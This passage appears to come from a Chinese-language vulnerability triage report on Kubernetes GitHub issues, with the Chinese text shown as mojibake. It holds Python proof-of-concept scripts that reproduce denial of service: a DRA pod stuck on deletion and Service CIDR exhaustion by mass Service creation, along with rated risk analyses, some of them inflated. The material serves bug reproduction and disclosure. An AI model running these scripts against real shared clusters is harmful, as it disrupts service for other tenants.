        print(f"[+] ResourceClaim '{RESOURCE_CLAIM_NAME}' åˆ›å»ºæˆåŠŸ")
    except ApiException as e:
        if e.status == 409:
            print(f"[*] ResourceClaim '{RESOURCE_CLAIM_NAME}' å·²å­˜åœ¨ï¼Œç»§ç»­æ‰§è¡Œ...")
        else:
            raise

def create_pod_with_claim(api: client.CoreV1Api):
    """åˆ›å»ºä½¿ç”¨ResourceClaimçš„Pod"""
    print(f"[+] æ­£åœ¨åˆ›å»ºPod: {POD_NAME}")
    pod_manifest = {
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {
            "name": POD_NAME,
        },
        "spec": {
            "containers": [{
                "name": "poc-container",
                "image": "registry.k8s.io/e2e-test-images/agnhost:2.40",
                "command": ["sleep", "3600"],
                "resources": {
                    "claims": [{
                        "name": "dynamic-resource"
                    }]
                }
            }],
            "resourceClaims": [{
                "name": "dynamic-resource",
                "source": {
                    "resourceClaimName": RESOURCE_CLAIM_NAME
                }
            }]
        }
    }
    api.create_namespaced_pod(namespace=POC_NAMESPACE, body=pod_manifest)
    print(f"[+] Pod '{POD_NAME}' åˆ›å»ºè¯·æ±‚å·²å‘é€")

def wait_for_pod_failed_state(api: client.CoreV1Api):
    """ç­‰å¾…Podè¿›å…¥å¤±è´¥çŠ¶æ€å¹¶æ£€æŸ¥ç‰¹å®šäº‹ä»¶"""
    print("[*] æ­£åœ¨ç­‰å¾…Podè¿›å…¥è°ƒåº¦å¤±è´¥çŠ¶æ€ (æœ€å¤š60ç§’)...")
    w = watch.Watch()
    start_time = time.time()
    for event in w.stream(api.list_namespaced_pod, namespace=POC_NAMESPACE, timeout_seconds=60):
        pod = event['object']
        if pod.metadata.name == POD_NAME:
            print(f"[*] Pod '{POD_NAME}' å½“å‰çŠ¶æ€: {pod.status.phase}")
            if pod.status.phase in ["Pending", "Failed"]:
                # æ£€æŸ¥äº‹ä»¶
                events = api.list_namespaced_event(namespace=POC_NAMESPACE, field_selector=f"involvedObject.name={POD_NAME}")
                for evt in events.items:
                    if evt.reason == "FailedPrepareDynamicResources":
                        print(f"[!] æˆåŠŸè§‚å¯Ÿåˆ°é¢„æœŸäº‹ä»¶: {evt.reason} - {evt.message}")
                        w.stop()
                        return True
        if time.time() - start_time > 60:
            break
    w.stop()
    print("[-] æœªèƒ½åœ¨è¶…æ—¶æ—¶é—´å†…è§‚å¯Ÿåˆ° 'FailedPrepareDynamicResources' äº‹ä»¶ã€‚")
    return False

def attempt_pod_deletion(api: client.CoreV1Api):
    """å°è¯•åˆ é™¤Podå¹¶éªŒè¯å…¶æ˜¯å¦è¢«å¡ä½"""
    print(f"[*] æ­£åœ¨å°è¯•åˆ é™¤Pod: {POD_NAME}")
    try:
        api.delete_namespaced_pod(name=POD_NAME, namespace=POC_NAMESPACE, body=client.V1DeleteOptions())
        print("[*] Podåˆ é™¤è¯·æ±‚å·²å‘é€ã€‚ç°åœ¨å°†ç›‘æ§å…¶æ˜¯å¦çœŸæ­£è¢«åˆ é™¤...")
    except ApiException as e:
        print(f"[-] åˆ é™¤Podæ—¶å‡ºé”™: {e}")
        return

    start_time = time.time()
    while time.time() - start_time < TIMEOUT_SECONDS - 60: # ç•™å‡ºæ—¶é—´ç»™å‰é¢çš„æ“ä½œ
        try:
            api.read_namespaced_pod(name=POD_NAME, namespace=POC_NAMESPACE)
            print(f"[*] {int(time.time() - start_time)}s: Pod '{POD_NAME}' ä»ç„¶å­˜åœ¨ã€‚åˆ é™¤æ“ä½œè¢«å¡ä½ã€‚")
            time.sleep(10)
        except ApiException as e:
            if e.status == 404:
                print("[-] Podå·²è¢«æˆåŠŸåˆ é™¤ï¼Œæ¼æ´æœªå¤ç°ã€‚")
                return False
            else:
                print(f"[-] æ£€æŸ¥PodçŠ¶æ€æ—¶å‘ç”Ÿæ„å¤–é”™è¯¯: {e}")
                return False
    
    print(f"\n[!!!] é«˜é£é™©æ¼æ´å¤ç°æˆåŠŸï¼")
    print(f"[!!!] åœ¨å‘é€åˆ é™¤è¯·æ±‚å {int(time.time() - start_time)} ç§’ï¼ŒPod '{POD_NAME}' ä»ç„¶å­˜åœ¨äºé›†ç¾¤ä¸­ï¼Œæ— æ³•è¢«åˆ é™¤ã€‚")
    return True

def cleanup(core_api: client.CoreV1Api, custom_obj_api: client.CustomObjectsApi):
    """æ¸…ç†æ‰€æœ‰åˆ›å»ºçš„èµ„æº"""
    print("\n[*] å¼€å§‹æ¸…ç†èµ„æº...")
    try:
        print(f"[*] æ­£åœ¨åˆ é™¤å‘½åç©ºé—´: {POC_NAMESPACE}")
        core_api.delete_namespace(name=POC_NAMESPACE, body=client.V1DeleteOptions())
        # åˆ é™¤å‘½åç©ºé—´ä¼šçº§è”åˆ é™¤å…¶ä¸­çš„æ‰€æœ‰èµ„æº
        print("[*] ç­‰å¾…å‘½åç©ºé—´åˆ é™¤å®Œæˆ...")
        w = watch.Watch()
        for event in w.stream(core_api.list_namespace, timeout_seconds=60):
             if event['object'].metadata.name == POC_NAMESPACE and event['type'] == 'DELETED':
                 print(f"[+] å‘½åç©ºé—´ '{POC_NAMESPACE}' å·²åˆ é™¤ã€‚")
                 w.stop()
                 break
    except ApiException as e:
        if e.status != 404:
            print(f"[-] æ¸…ç†å‘½åç©ºé—´æ—¶å‡ºé”™: {e}")
    
    try:
        print(f"[*] æ­£åœ¨åˆ é™¤ResourceClass: {RESOURCE_CLASS_NAME}")
        custom_obj_api.delete_cluster_custom_object(
            group="resource.k8s.io",
            version="v1alpha2",
            plural="resourceclasses",
            name=RESOURCE_CLASS_NAME
        )
        print(f"[+] ResourceClass '{RESOURCE_CLASS_NAME}' å·²åˆ é™¤ã€‚")
    except ApiException as e:
        if e.status != 404:
            print(f"[-] æ¸…ç†ResourceClassæ—¶å‡ºé”™: {e}")
            
    print("[*] æ¸…ç†å®Œæˆã€‚")

def main():
    """ä¸»æ‰§è¡Œå‡½æ•°"""
    start_total_time = time.time()
    with get_k8s_api() as (core_v1, resource_v1alpha2):
        try:
            # 1. åˆ›å»ºç¯å¢ƒ
            create_namespace(core_v1, POC_NAMESPACE)
            create_resource_class(resource_v1alpha2)
            create_resource_claim(resource_v1alpha2)
            
            # 2. åˆ›å»ºè§¦å‘æ¼æ´çš„Pod
            create_pod_with_claim(core_v1)
            
            # 3. éªŒè¯PodçŠ¶æ€
            if not wait_for_pod_failed_state(core_v1):
                print("[-] æ— æ³•å°†Podç½®äºé¢„æœŸçš„å¤±è´¥çŠ¶æ€ï¼Œæµ‹è¯•ä¸­æ­¢ã€‚")
                return

            # 4. å°è¯•åˆ é™¤å¹¶éªŒè¯DoS
            attempt_pod_deletion(core_v1)

        except Exception as e:
            print(f"\n[-] POCæ‰§è¡ŒæœŸé—´å‘ç”Ÿæ„å¤–é”™è¯¯: {e}")
        finally:
            # 5. æ¸…ç†èµ„æº
            cleanup(core_v1, resource_v1alpha2)
            end_total_time = time.time()
            print(f"\n[*] POCæ€»æ‰§è¡Œæ—¶é—´: {end_total_time - start_total_time:.2f} ç§’ã€‚")

# ç›´æ¥æ‰§è¡Œmainå‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Pythonè„šæœ¬é€šè¿‡ä¸Kubernetes APIç›´æ¥äº¤äº’ï¼Œç²¾ç¡®åœ°å¤ç°äº†Issueä¸­æè¿°çš„æ‹’ç»æœåŠ¡æ¼æ´ã€‚

1.  **ç¯å¢ƒå‡†å¤‡ (`get_k8s_api`, `create_namespace`)**: è„šæœ¬é¦–å…ˆåŠ è½½æœ¬åœ°çš„ `kubeconfig` æ–‡ä»¶ä»¥è·å¾—ä¸Kubernetesé›†ç¾¤äº¤äº’çš„æƒé™ã€‚ä¸ºäº†éš”ç¦»æµ‹è¯•å¹¶æ–¹ä¾¿æ¸…ç†ï¼Œå®ƒä¼šåˆ›å»ºä¸€ä¸ªå”¯ä¸€çš„å‘½åç©ºé—´ï¼ˆä¾‹å¦‚ `dra-dos-poc-xxxxxx`ï¼‰ã€‚

2.  **æ¨¡æ‹ŸDRAèµ„æº (`create_resource_class`, `create_resource_claim`)**:
    *   `create_resource_class` å‡½æ•°åˆ›å»ºäº†ä¸€ä¸ªåä¸º `poc-resource-class` çš„ `ResourceClass` å¯¹è±¡ã€‚å…³é”®åœ¨äºï¼Œè¿™ä¸ª `ResourceClass` æŒ‡å‘ä¸€ä¸ªè™šæ„ä¸”ä¸å­˜åœ¨çš„é©±åŠ¨ç¨‹åº `non-existent-driver.example.com`ã€‚
    *   `create_resource_claim` å‡½æ•°æ¥ç€åœ¨æµ‹è¯•å‘½åç©ºé—´ä¸­åˆ›å»ºäº†ä¸€ä¸ª `ResourceClaim`ï¼Œå®ƒè¯·æ±‚ä½¿ç”¨ä¸Šé¢å®šä¹‰çš„ `ResourceClass`ã€‚

3.  **è§¦å‘æ¼æ´ (`create_pod_with_claim`)**:
    *   è„šæœ¬åˆ›å»ºä¸€ä¸ªåä¸º `poc-stuck-pod` çš„Podã€‚
    *   æ­¤Podçš„å®šä¹‰ä¸­åŒ…å«ä¸€ä¸ª `resourceClaims` å­—æ®µï¼Œå¼•ç”¨äº†ä¹‹å‰åˆ›å»ºçš„ `ResourceClaim`ã€‚
    *   å½“è¿™ä¸ªPodè¢«è°ƒåº¦åˆ°ä»»ä½•ä¸€ä¸ªèŠ‚ç‚¹ä¸Šæ—¶ï¼Œè¯¥èŠ‚ç‚¹çš„ `kubelet` ä¼šå°è¯•ä¸ºPodå‡†å¤‡å…¶è¯·æ±‚çš„åŠ¨æ€èµ„æºã€‚

4.  **éªŒè¯åˆå§‹å¤±è´¥çŠ¶æ€ (`wait_for_pod_failed_state`)**:
    *   ç”±äº `non-existent-driver.example.com` é©±åŠ¨ä¸å­˜åœ¨ï¼Œ`kubelet` æ— æ³•å‡†å¤‡èµ„æºã€‚
    *   è„šæœ¬ä¼šç›‘æ§Podçš„çŠ¶æ€ï¼Œå¹¶æ£€æŸ¥ä¸ä¹‹ç›¸å…³çš„äº‹ä»¶ã€‚å®ƒä¼šç­‰å¾…å¹¶ç¡®è®¤æ”¶åˆ°äº† `FailedPrepareDynamicResources` äº‹ä»¶ï¼Œè¿™è¯æ˜Podå·²è¿›å…¥äº†é¢„æœŸçš„å¤±è´¥çŠ¶æ€ï¼Œå¤ç°äº†é—®é¢˜çš„ç¬¬ä¸€é˜¶æ®µã€‚

5.  **å¤ç°åˆ é™¤æŒ‚èµ· (`attempt_pod_deletion`)**:
    *   è¿™æ˜¯POCçš„æ ¸å¿ƒã€‚è„šæœ¬ä¼šå‘API Serverå‘é€åˆ é™¤ `poc-stuck-pod` çš„è¯·æ±‚ã€‚
    *   æ ¹æ®æ¼æ´æè¿°ï¼Œå°½ç®¡API Serveræ¥æ”¶äº†åˆ é™¤æŒ‡ä»¤ï¼Œä½† `kubelet` ä¼šå› ä¸ºæ— æ³•è°ƒç”¨ï¼ˆä¸å­˜åœ¨çš„ï¼‰é©±åŠ¨çš„ `NodeUnprepareResources` æ¥å£è€Œå¡ä½ï¼Œå¯¼è‡´Podæ— æ³•è¢«çœŸæ­£æ¸…ç†ã€‚
    *   è„šæœ¬ä¼šè¿›å…¥ä¸€ä¸ªå¾ªç¯ï¼Œåœ¨æ¥ä¸‹æ¥çš„ä¸€åˆ†å¤šé’Ÿå†…ï¼Œæ¯éš”10ç§’æ£€æŸ¥ä¸€æ¬¡Podå¯¹è±¡æ˜¯å¦ä»ç„¶å­˜åœ¨ã€‚
    *   å¦‚æœåœ¨è¿™æ®µæ—¶é—´å†…Podä¸€ç›´å­˜åœ¨ï¼Œè„šæœ¬å°±ä¼šæ‰“å°æˆåŠŸå¤ç°æ¼æ´çš„æ¶ˆæ¯ã€‚è¿™è¡¨æ˜Podç¡®å®è¢«"å¡ä½"äº†ï¼Œæ— æ³•è¢«æ­£å¸¸åˆ é™¤ã€‚

6.  **æ¸…ç† (`cleanup`)**:
    *   åœ¨è„šæœ¬çš„æœ€åï¼Œ`finally` å—ç¡®ä¿æ— è®ºæˆåŠŸä¸å¦éƒ½ä¼šæ‰§è¡Œæ¸…ç†æ“ä½œã€‚
    *   å®ƒä¼šåˆ é™¤ä¹‹å‰åˆ›å»ºçš„å‘½åç©ºé—´å’Œ `ResourceClass`ã€‚åˆ é™¤å‘½åç©ºé—´æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„æ¸…ç†ç­–ç•¥ï¼Œå› ä¸ºå®ƒä¼šç”±Kubernetesè‡ªåŠ¨å›æ”¶å…¶ä¸­åŒ…å«çš„æ‰€æœ‰èµ„æºï¼ŒåŒ…æ‹¬é‚£ä¸ªè¢«å¡ä½çš„Podã€‚

è¯¥è„šæœ¬å®Œå…¨è‡ªåŠ¨åŒ–äº†æ¼æ´çš„è§¦å‘å’ŒéªŒè¯è¿‡ç¨‹ï¼Œä¸ºå¼€å‘è€…å’Œå®‰å…¨ç ”ç©¶äººå‘˜æä¾›äº†ä¸€ä¸ªæ— éœ€æ‰‹åŠ¨æ“ä½œå³å¯é‡ç°è¯¥é«˜é£é™©æ‹’ç»æœåŠ¡é—®é¢˜çš„å·¥å…·ã€‚

---


## Issue #131866 [ServiceCIDR] - Automatic allocation of second/additional range not occurring

- Issue é“¾æ¥ï¼š[#131866](https://github.com/kubernetes/kubernetes/issues/131866)

### Issue å†…å®¹

#### What happened?

Having added an additional ServiceCIDR range to my AKS instance, and having exhausted my original range, new services are failing to be created 
"Error from server (InternalError): error when creating "STDIN": Internal error occurred: failed to allocate a serviceIP: range is full"
The new secondary/additional range is not being used to allocate IPs. 

If I add a clusterIP from the new range and manually deploy a service, this succeeds and works fine, proving the range itself is valid and recognised as such. But the automatic element of the system doing this does not appear to be occuring. 

#### What did you expect to happen?

For IP allocation to services to be fairly randomised between the available ranges. Or at a bear minimum, for the original range to be used until exhausted, and then the secondary/additional ranges to be picked up and used onwards. 

#### How can we reproduce it (as minimally and precisely as possible)?

AKS 1.33 (preview) cluster. Add additional Service-CIDR. Depending on your original CIDR range size, create dummy services to essentially exhaust all of the original range IPs. 
Something like (change values to suit):

for i in $(seq 1 200); do
  cat <<EOF | kubectl apply -n $NAMESPACE -f -
apiVersion: v1
kind: Service
metadata:
  name: dummy-service-$i
spec:
  selector:
    app: dummy
  ports:
  - protocol: TCP
    port: 80
    targetPort: 80
EOF
  done

You will notice that none of these dummy services are picking up the additional range, and once the original is exhausted the aforementioned error will be thrown

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# Client Version: v1.33.0
Kustomize Version: v5.6.0
Server Version: v1.33.0
```

</details>


#### Cloud provider

<details>
Azure
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
é«˜é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†ä¸€ä¸ªåœ¨Kubernetesé›†ç¾¤ä¸­ï¼ˆç‰¹åˆ«æ˜¯Azure Kubernetes Service - AKSï¼‰å…³äºService CIDR IPåœ°å€åˆ†é…çš„ç¼ºé™·ã€‚

é—®é¢˜æ ¸å¿ƒåœ¨äºï¼Œå½“ç”¨æˆ·é…ç½®äº†å¤šä¸ªService CIDRèŒƒå›´ï¼ˆä¸€ä¸ªä¸»èŒƒå›´å’Œä¸€ä¸ªæˆ–å¤šä¸ªè¾…åŠ©èŒƒå›´ï¼‰åï¼ŒKubernetesçš„IPåœ°å€ç®¡ç†å™¨ï¼ˆIPAMï¼‰åœ¨ä¸»CIDRèŒƒå›´çš„IPåœ°å€è€—å°½æ—¶ï¼Œæœªèƒ½è‡ªåŠ¨åˆ‡æ¢åˆ°è¾…åŠ©CIDRèŒƒå›´æ¥ä¸ºæ–°çš„Serviceåˆ†é…ClusterIPã€‚ç›¸åï¼Œå®ƒç›´æ¥æŠ¥é”™ "failed to allocate a serviceIP: range is full"ï¼Œå¯¼è‡´æ–°çš„æœåŠ¡æ— æ³•åˆ›å»ºã€‚

ä»å®‰å…¨è§’åº¦åˆ†æï¼š
1.  **æ¼æ´ç±»å‹**ï¼šè¿™æ˜¯ä¸€ä¸ªå¯ç”¨æ€§é—®é¢˜ï¼Œå…·ä½“æ¥è¯´æ˜¯èµ„æºè€—å°½å¯¼è‡´çš„æ‹’ç»æœåŠ¡ï¼ˆDenial of Service, DoSï¼‰ã€‚
2.  **æ”»å‡»å‘é‡**ï¼šæ”»å‡»è€…éœ€è¦æ‹¥æœ‰åœ¨é›†ç¾¤å†…åˆ›å»º`Service`èµ„æºçš„æƒé™ã€‚è¿™ç§æƒé™åœ¨å¤šç§Ÿæˆ·é›†ç¾¤ä¸­é€šå¸¸ä¼šåˆ†é…ç»™æ™®é€šç”¨æˆ·æˆ–å¼€å‘è€…ï¼Œä½¿å…¶èƒ½åœ¨è‡ªå·±çš„å‘½åç©ºé—´å†…ç®¡ç†åº”ç”¨ã€‚
3.  **å½±å“èŒƒå›´**ï¼šServiceçš„ClusterIPåœ°å€æ± æ˜¯ä¸€ä¸ªé›†ç¾¤çº§åˆ«çš„å…±äº«èµ„æºã€‚å³ä½¿æ”»å‡»è€…åªåœ¨è‡ªå·±çš„å‘½åç©ºé—´å†…æ“ä½œï¼Œå…¶è¡Œä¸ºä¹Ÿä¼šè€—å°½æ•´ä¸ªé›†ç¾¤çš„ä¸»CIDR IPæ± ã€‚ä¸€æ—¦ä¸»CIDRæ± è€—å°½ï¼Œé›†ç¾¤ä¸­æ‰€æœ‰ç”¨æˆ·ï¼ˆåŒ…æ‹¬é›†ç¾¤ç®¡ç†å‘˜å’Œå…¶ä»–ç§Ÿæˆ·ï¼‰éƒ½å°†æ— æ³•åˆ›å»ºæ–°çš„`Service`ï¼ˆç±»å‹ä¸ºClusterIPæˆ–LoadBalancer/NodePortï¼Œå› ä¸ºå®ƒä»¬ä¹Ÿéœ€è¦ClusterIPï¼‰ã€‚è¿™å°†ä¸¥é‡å½±å“æ–°åº”ç”¨çš„éƒ¨ç½²ã€ç°æœ‰åº”ç”¨çš„æ›´æ–°å’Œç³»ç»Ÿæ ¸å¿ƒç»„ä»¶çš„æ­£å¸¸è¿è¡Œï¼Œæ„æˆå…¨é›†ç¾¤èŒƒå›´çš„æ‹’ç»æœåŠ¡ã€‚
4.  **é£é™©è¯„ä¼°**ï¼šæ ¹æ®CVSS 3.1æ ‡å‡†è¯„ä¼°ï¼š
    *   **Attack Vector (AV): Network (N)** - æ”»å‡»é€šè¿‡Kubernetes APIè¿›è¡Œã€‚
    *   **Attack Complexity (AC): Low (L)** - æ”»å‡»è€…åªéœ€ä¸æ–­åˆ›å»ºServiceå³å¯ï¼Œæ“ä½œç®€å•ã€‚
    *   **Privileges Required (PR): Low (L)** - ä»…éœ€åœ¨æŸä¸ªå‘½åç©ºé—´å†…åˆ›å»ºServiceçš„æƒé™ï¼Œè¿™æ˜¯éç®¡ç†å‘˜çš„å¸¸è§æƒé™ã€‚
    *   **User Interaction (UI): None (N)** - æ— éœ€ç”¨æˆ·äº¤äº’ã€‚
    *   **Scope (S): Changed (C)** - æ”»å‡»è€…åœ¨è‡ªèº«æƒé™èŒƒå›´ï¼ˆä¸€ä¸ªå‘½åç©ºé—´ï¼‰å†…çš„æ“ä½œï¼Œå½±å“äº†æ•´ä¸ªé›†ç¾¤çš„å¯ç”¨æ€§ï¼ˆä¸€ä¸ªæ›´å¤§çš„æˆæƒèŒƒå›´ï¼‰ã€‚
    *   **Confidentiality (C): None (N)** - ä¸å½±å“æœºå¯†æ€§ã€‚
    *   **Integrity (I): None (N)** - ä¸å½±å“å®Œæ•´æ€§ã€‚
    *   **Availability (A): High (H)** - å¯¼è‡´æ ¸å¿ƒçš„é›†ç¾¤åŠŸèƒ½ï¼ˆåˆ›å»ºæœåŠ¡ï¼‰å¯¹æ‰€æœ‰ç”¨æˆ·å®Œå…¨ä¸å¯ç”¨ã€‚

    ç»¼åˆè¯„åˆ† (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:H) ä¸º **8.6**ï¼Œå±äºé«˜é£é™©ã€‚

ç»“è®ºï¼šæ­¤é—®é¢˜æ˜¯ä¸€ä¸ªé«˜é£é™©çš„æ‹’ç»æœåŠ¡æ¼æ´ã€‚ä¸€ä¸ªä½æƒé™ç”¨æˆ·å¯ä»¥é€šè¿‡è€—å°½ä¸»Service CIDRæ± ï¼Œå¯¼è‡´æ•´ä¸ªé›†ç¾¤æ— æ³•æä¾›æ–°çš„æœåŠ¡ï¼Œå®ç°äº†è·¨ç§Ÿæˆ·çš„å¯ç”¨æ€§æ”»å‡»ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import os
import sys
import time
import logging
import uuid
from kubernetes import client, config
from kubernetes.client.rest import ApiException

# é…ç½®æ—¥å¿—
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# å®šä¹‰å¸¸é‡
RUN_ID = str(uuid.uuid4())[:8]
NAMESPACE = f"dos-service-cidr-test-{RUN_ID}"
SERVICE_PREFIX = "dummy-service-"
# è®¾ç½®è¶…æ—¶æ—¶é—´ä¸º120ç§’ï¼Œä»¥é˜²ä¸»CIDRèŒƒå›´è¿‡å¤§æ— æ³•åœ¨çŸ­æ—¶é—´å†…è€—å°½
TIMEOUT_SECONDS = 120

def main():
    """
    ä¸»æ‰§è¡Œå‡½æ•°ï¼Œç”¨äºå¤ç°Service CIDRè€—å°½é—®é¢˜ã€‚
    """
    try:
        # ä»é»˜è®¤ä½ç½®åŠ è½½kubeconfigæ–‡ä»¶
        logging.info("åŠ è½½kubeconfigé…ç½®...")
        config.load_kube_config()
    except config.ConfigException:
        logging.error("æ— æ³•åŠ è½½kubeconfigã€‚è¯·ç¡®ä¿~/.kube/configæ–‡ä»¶å­˜åœ¨ä¸”é…ç½®æ­£ç¡®ã€‚")
        sys.exit(1)

    # åˆ›å»ºAPIå®¢æˆ·ç«¯
    core_v1 = client.CoreV1Api()
    
    # åˆ›å»ºç”¨äºæµ‹è¯•çš„å‘½åç©ºé—´
    namespace_manifest = client.V1Namespace(metadata=client.V1ObjectMeta(name=NAMESPACE))
    try:
        logging.info(f"åˆ›å»ºæµ‹è¯•å‘½åç©ºé—´: {NAMESPACE}")
        core_v1.create_namespace(body=namespace_manifest)
    except ApiException as e:
        logging.error(f"åˆ›å»ºå‘½åç©ºé—´å¤±è´¥: {e}")
        sys.exit(1)

    created_services = []
    start_time = time.time()
    vulnerability_reproduced = False

    try:
        logging.info(f"å¼€å§‹åœ¨å‘½åç©ºé—´ {NAMESPACE} ä¸­åˆ›å»ºæœåŠ¡ä»¥è€—å°½ä¸»Service CIDR...")
        logging.info("æ³¨æ„: è¿™å¯èƒ½ä¼šåˆ›å»ºå¤§é‡Serviceèµ„æºã€‚")

        # å¾ªç¯åˆ›å»ºæœåŠ¡ï¼Œç›´åˆ°APIè¿”å›é”™è¯¯æˆ–è¶…æ—¶
        # ä¸€ä¸ª/24çš„CIDRå¤§çº¦æœ‰254ä¸ªå¯ç”¨IPï¼Œè®¾ç½®ä¸€ä¸ªç¨å¤§çš„å¾ªç¯æ¬¡æ•°
        for i in range(1, 300):
            # æ£€æŸ¥æ˜¯å¦è¶…æ—¶
            if time.time() - start_time > TIMEOUT_SECONDS:
                logging.warning("æµ‹è¯•è¶…æ—¶ï¼Œæœªèƒ½å¤ç°æ¼æ´ã€‚å¯èƒ½æ˜¯ä¸»CIDRèŒƒå›´å¤ªå¤§ã€‚")
                break

            service_name = f"{SERVICE_PREFIX}{i}"
            service_manifest = client.V1Service(
                api_version="v1",
                kind="Service",
                metadata=client.V1ObjectMeta(name=service_name),
                spec=client.V1ServiceSpec(
                    selector={"app": "dummy"},
                    ports=[client.V1ServicePort(protocol="TCP", port=80, target_port=80)]
                )
            )

            try:
                core_v1.create_namespaced_service(namespace=NAMESPACE, body=service_manifest)
                created_services.append(service_name)
                logging.info(f"æˆåŠŸåˆ›å»ºæœåŠ¡: {service_name}")
            except ApiException as e:
                # æ£€æŸ¥æ˜¯å¦æ˜¯IPèŒƒå›´è€—å°½çš„é”™è¯¯
                if "range is full" in e.body:
                    logging.info("************************************************************")
                    logging.info("æˆåŠŸå¤ç°æ¼æ´ï¼")
                    logging.info(f"é”™è¯¯ä¿¡æ¯: {e.body.strip()}")
                    logging.info("é›†ç¾¤ä¸»Service CIDRå·²è€—å°½ï¼Œä¸”æœªèƒ½è‡ªåŠ¨ä½¿ç”¨å¤‡ç”¨CIDRã€‚")
                    logging.info("************************************************************")
                    vulnerability_reproduced = True
                    break
                else:
                    logging.error(f"åˆ›å»ºæœåŠ¡ {service_name} æ—¶å‘ç”ŸæœªçŸ¥APIé”™è¯¯: {e}")
                    # å¦‚æœæ˜¯å…¶ä»–é”™è¯¯ï¼Œå¯èƒ½æ„å‘³ç€æƒé™é—®é¢˜ç­‰ï¼Œä¸­æ­¢æµ‹è¯•
                    break
            
            # çŸ­æš‚ä¼‘çœ ä»¥é¿å…APIé™é€Ÿ
            time.sleep(0.1)

        if not vulnerability_reproduced and not (time.time() - start_time > TIMEOUT_SECONDS):
            logging.warning("å¾ªç¯å®Œæˆä½†æœªè§¦å‘ 'range is full' é”™è¯¯ã€‚è¯·ç¡®è®¤ä¸»Service CIDRçš„å¤§å°ã€‚")

    finally:
        # æ¸…ç†èµ„æº
        logging.info("å¼€å§‹æ¸…ç†æ‰€æœ‰å·²åˆ›å»ºçš„èµ„æº...")
        for service_name in created_services:
            try:
                core_v1.delete_namespaced_service(name=service_name, namespace=NAMESPACE)
                logging.info(f"å·²åˆ é™¤æœåŠ¡: {service_name}")
            except ApiException as e:
                logging.warning(f"åˆ é™¤æœåŠ¡ {service_name} å¤±è´¥: {e}")
        
        try:
            logging.info(f"åˆ é™¤æµ‹è¯•å‘½åç©ºé—´: {NAMESPACE}")
            core_v1.delete_namespace(name=NAMESPACE)
            logging.info("æ¸…ç†å®Œæˆã€‚")
        except ApiException as e:
            logging.error(f"åˆ é™¤å‘½åç©ºé—´ {NAMESPACE} å¤±è´¥: {e}")

main()
```


---


## Issue #131853 [KMS] The transformer cache may explode when users do not re-encrypt all secrets

- Issue é“¾æ¥ï¼š[#131853](https://github.com/kubernetes/kubernetes/issues/131853)

### Issue å†…å®¹

#### What happened?

From https://github.com/kubernetes/kubernetes/blob/3196c9946355c1d20086f66c22e9e5364fb0a56f/staging/src/k8s.io/apiserver/pkg/server/options/encryptionconfig/config.go#L416 and https://github.com/kubernetes/kubernetes/blob/3196c9946355c1d20086f66c22e9e5364fb0a56f/staging/src/k8s.io/apiserver/pkg/storage/value/encrypt/envelope/kmsv2/envelope.go#L334C6-L386, it seems like that the DEK seed is always rotated when the API server is restarted or the key ID returned by Status is changed. 
When a new DEK seed is generated, a new cache will be added when decrypting the data with the DEK generated from this DEK seed. Reference: https://github.com/kubernetes/kubernetes/blob/master/staging/src/k8s.io/apiserver/pkg/storage/value/encrypt/envelope/kmsv2/envelope.go#L172-L207

And according to the below comment in https://github.com/kubernetes/kubernetes/blob/3196c9946355c1d20086f66c22e9e5364fb0a56f/staging/src/k8s.io/apiserver/pkg/storage/value/encrypt/envelope/kmsv2/envelope.go#L65-L76, it seems like that it cannot limit the size of the cache. When users do not re-encrypt all secrets, more DEK seeds will be used after a long while and the cache may explode.
```
	// cacheTTL is the default time-to-live for the cache entry.
	// this allows the cache to grow to an infinite size for up to a day.
	// there is unlikely to be any meaningful memory impact on the server
	// because the cache will likely never have more than a few thousand entries.
	// each entry can be large due to an internal cache that maps the DEK seed to individual
	// DEK entries, but that cache has an aggressive TTL to keep the size under control.
	// with DEK/seed reuse and no storage migration, the number of entries in this cache
	// would be approximated by unique key IDs used by the KMS plugin
	// combined with the number of server restarts.  If storage migration
	// is performed after key ID changes, and the number of restarts
	// is limited, this cache size may be as small as the number of API
	// servers in use (once old entries expire out from the TTL).
```

#### What did you expect to happen?

The cache size does not rely on the user's behavior. The API server can patch the secret when the data is stale.

#### How can we reproduce it (as minimally and precisely as possible)?

Restart the api server constantly and create secrets at the same time.

#### Anything else we need to know?

_No response_

#### Kubernetes version

Generic issue

#### Cloud provider

Generic issue

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
é«˜é£é™©

**åˆ¤æ–­ä¾æ®**:
1.  **æ¼æ´ç±»å‹**: ä¸å—æ§åˆ¶çš„èµ„æºæ¶ˆè€—å¯¼è‡´çš„æ‹’ç»æœåŠ¡ï¼ˆCWE-400ï¼‰ã€‚
2.  **å½±å“**: æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´å¯ä»¥ä½¿ Kubernetes API Server å´©æºƒï¼Œå¯¼è‡´æ•´ä¸ªæ§åˆ¶å¹³é¢ä¸å¯ç”¨ï¼Œå½±å“é›†ç¾¤çš„å…¨éƒ¨åŠŸèƒ½ã€‚è¿™å¯¹åº” CVSS 3.1 çš„å¯ç”¨æ€§ï¼ˆAvailabilityï¼‰å½±å“ä¸ºé«˜ï¼ˆHighï¼‰ã€‚
